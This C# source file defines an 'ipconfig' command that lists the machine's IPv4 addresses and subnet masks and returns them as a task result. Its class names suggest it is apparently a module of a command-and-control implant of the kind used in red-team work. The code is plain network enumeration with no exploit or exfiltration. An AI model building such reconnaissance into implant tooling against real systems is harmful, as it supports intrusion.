using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class ipconfig : EngineerCommand
    {
        public override string Name => "ipconfig";

        public override async Task Execute(EngineerTask task)
        {
            //get all of the ip addresses and subnet masks
            var ipAddresses = NetworkInterface.GetAllNetworkInterfaces()
                .SelectMany(x => x.GetIPProperties().UnicastAddresses)
                .Where(x => x.Address.AddressFamily == AddressFamily.InterNetwork)
                .Select(x => x.Address.ToString() + " " + x.IPv4Mask.ToString())
                .ToList();
            //use a string builder to build the output one address and mask per line
            var output = new StringBuilder();
            foreach (var ipAddress in ipAddresses)
            {
                output.AppendLine(ipAddress);
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete,TaskResponseType.String);
        }
    }
}
